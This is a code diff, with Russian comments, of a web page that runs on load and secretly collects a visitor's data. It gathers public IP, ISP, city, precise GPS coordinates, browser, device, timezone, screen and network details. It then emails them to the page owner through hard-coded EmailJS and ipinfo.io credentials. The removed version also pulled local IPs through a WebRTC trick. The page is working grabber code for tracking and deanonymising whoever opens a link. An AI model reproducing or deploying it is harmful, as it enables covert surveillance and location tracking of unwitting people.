@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send IP and Location with Anti-Spam</title>
+    <title>Send User Data</title>
 
     <!-- Подключение актуального EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
@@ -12,113 +12,117 @@
             emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
         })();
 
-        // Получение IP-адреса
-        function getUserIP(onNewIP) {
-            var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            var pc = new myPeerConnection({
-                iceServers: []
-            }),
-            noop = function() {},
-            localIPs = {},
-            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
+        // Получение данных о пользователе
+        function collectData() {
+            let userData = {};
 
-            function iterateIP(ip) {
-                if (!localIPs[ip]) onNewIP(ip);
-                localIPs[ip] = true;
+            // Получение IP и Провайдера через ipinfo.io
+            function getIPAndProvider() {
+                const token = "229d6455ecea02"; // Ваш токен для ipinfo.io
+                fetch(`https://ipinfo.io?token=${token}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        userData.ip = data.ip;
+                        userData.provider = data.org || 'Не удалось определить';
+                        userData.location = data.city + ', ' + data.region + ', ' + data.country;
+                    })
+                    .catch(error => {
+                        userData.ip = "Не удалось получить IP";
+                        userData.provider = "Не удалось получить провайдера";
+                        console.error("Ошибка получения IP", error);
+                    });
             }
 
-            pc.createDataChannel("");
-            pc.createOffer().then(function(sdp) {
-                sdp.sdp.split('\n').forEach(function(line) {
-                    if (line.indexOf('candidate') < 0) return;
-                    line.match(ipRegex).forEach(iterateIP);
-                });
-                pc.setLocalDescription(sdp, noop, noop);
-            }).catch(function(reason) {});
-
-            pc.onicecandidate = function(ice) {
-                if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
-                ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
-            };
-        }
-
-        // Отправка данных на почту
-        function sendData(userData) {
-            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
-                .then(function(response) {
-                    console.log("Email sent successfully", response);
-                    alert('Данные отправлены на вашу почту!');
-                    if (userData.location) {
-                        markIpAsSent(userData.ip); // Помечаем IP как отправленный с геолокацией
-                    }
-                }, function(error) {
-                    console.error("Failed to send email", error);
-                    alert("Ошибка при отправке данных: " + error.text);
-                });
-        }
-
-        // Проверка, отправлялись ли данные с этого IP
-        function isIpAlreadySent(ip) {
-            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
-            return sentIps[ip] && sentIps[ip].locationSent;
-        }
-
-        // Пометка IP как отправленного с геолокацией
-        function markIpAsSent(ip) {
-            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
-            sentIps[ip] = { locationSent: true };
-            localStorage.setItem('sentIps', JSON.stringify(sentIps));
-        }
-
-        // Отображение сообщения об ошибке на экране
-        function showError(message) {
-            const errorElement = document.createElement('div');
-            errorElement.textContent = message;
-            errorElement.style.color = 'red';
-            errorElement.style.fontWeight = 'bold';
-            errorElement.style.marginTop = '20px';
-            document.body.appendChild(errorElement);
-        }
-
-        // Основная функция для получения данных пользователя
-        function getUserData() {
-            getUserIP(function(ip) {
-                console.log("Получен IP:", ip);  
-
-                // Проверяем, был ли этот IP уже отправлен с геолокацией
-                if (isIpAlreadySent(ip)) {
-                    console.log("Этот IP уже отправлял данные с геолокацией. Отправка отменена.");
-                    showError("Error(136)"); // Показ сообщения об ошибке
-                    return;
-                }
-
-                let userData = { ip: ip };
-
+            // Получение геолокации (широта и долгота)
+            function getGeolocation() {
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(position) {
-                        userData.location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        console.log("Геолокация получена:", userData.location);
-                        sendData(userData);
+                    navigator.geolocation.getCurrentPosition(position => {
+                        userData.latitude = position.coords.latitude;
+                        userData.longitude = position.coords.longitude;
+                        userData.accuracy = position.coords.accuracy;
                     }, function(error) {
-                        alert('Ошибка при получении геолокации: ' + error.message);
-                        sendData(userData);  // Отправка данных только с IP
+                        userData.latitude = "Не удалось получить широту";
+                        userData.longitude = "Не удалось получить долготу";
                     });
                 } else {
-                    alert("Геолокация не поддерживается этим браузером.");
-                    sendData(userData);  // Отправка данных только с IP
+                    userData.latitude = "Геолокация не поддерживается";
+                    userData.longitude = "Геолокация не поддерживается";
                 }
-            });
+            }
+
+            // Получение данных о браузере
+            function getBrowserInfo() {
+                userData.userAgent = navigator.userAgent;
+                userData.language = navigator.language;
+                userData.platform = navigator.platform;
+                userData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                userData.screenWidth = window.screen.width;
+                userData.screenHeight = window.screen.height;
+            }
+
+            // Сетевые данные
+            function getNetworkInfo() {
+                if (navigator.connection) {
+                    userData.connectionType = navigator.connection.effectiveType;
+                    userData.downlink = navigator.connection.downlink;
+                    userData.rtt = navigator.connection.rtt;
+                }
+            }
+
+            // Тип устройства
+            function getDeviceType() {
+                const ua = navigator.userAgent;
+                if (/Mobi|Android/i.test(ua)) {
+                    userData.deviceType = "Мобильное устройство";
+                } else if (/Tablet|iPad/i.test(ua)) {
+                    userData.deviceType = "Планшет";
+                } else {
+                    userData.deviceType = "Настольное устройство";
+                }
+            }
+
+            // Получение текущей страницы
+            function getCurrentPage() {
+                userData.url = window.location.href;
+            }
+
+            // Время нахождения на странице
+            function getSessionTime() {
+                userData.pageLoadTime = Date.now();
+            }
+
+            // Отправка данных на почту
+            function sendData() {
+                // Отправка данных в шаблон EmailJS
+                emailjs.send("Hjikwe21782", "template_73zczgq", userData)
+                    .then(function(response) {
+                        console.log("Email sent successfully", response);
+                        alert('Данные отправлены на вашу почту!');
+                    }, function(error) {
+                        console.error("Failed to send email", error);
+                        alert("Ошибка при отправке данных: " + error.text);
+                    });
+            }
+
+            // Собираем все данные
+            getIPAndProvider();
+            getGeolocation();
+            getBrowserInfo();
+            getNetworkInfo();
+            getDeviceType();
+            getCurrentPage();
+            getSessionTime();
+
+            // Немедленно отправляем данные после их сбора
+            setTimeout(() => sendData(), 3000); // 3 секунды ожидания для сбора данных
         }
 
         window.onload = function() {
-            getUserData();
+            collectData();
         }
     </script>
 </head>
 <body>
-    <h1>Отправка данных с анти-спам системой</h1>
+    <h1>Отправка всех данных о пользователе</h1>
 </body>
 </html>
